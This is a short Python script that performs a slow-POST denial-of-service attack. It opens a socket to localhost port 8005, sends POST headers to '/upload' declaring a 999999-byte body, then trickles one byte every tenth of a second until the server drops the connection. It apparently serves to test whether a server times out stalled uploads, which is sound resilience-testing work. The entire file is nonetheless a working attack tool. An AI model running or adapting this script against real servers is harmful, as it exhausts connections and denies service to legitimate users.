import time
import socket

EXPECTED_LISTENING_PORT = 8005
UPLOAD_PAGE_NAME = '/upload'

def slow_dos(s):
    starttime = time.time()
    s.settimeout(0.1)
    print("[*] Sending POST headers")
    s.send(f"POST {UPLOAD_PAGE_NAME} HTTP/1.1\r\nContent-Length: 999999\r\n".encode())
    
    print("[*] Starting to send POST data slowly...")
    while True:
        s.send(b'A')
        time.sleep(0.1)
        try:
            rsp = s.recv(1)
            if not rsp:
                print("[*] Connection closed by server")
                # Server killed the connection
                return
        except socket.timeout as e:
            pass

def main():
    s = socket.socket()
    s.connect(('localhost', EXPECTED_LISTENING_PORT))
    print("[*] Connected")
    slow_dos(s)

if __name__ == "__main__":
    main()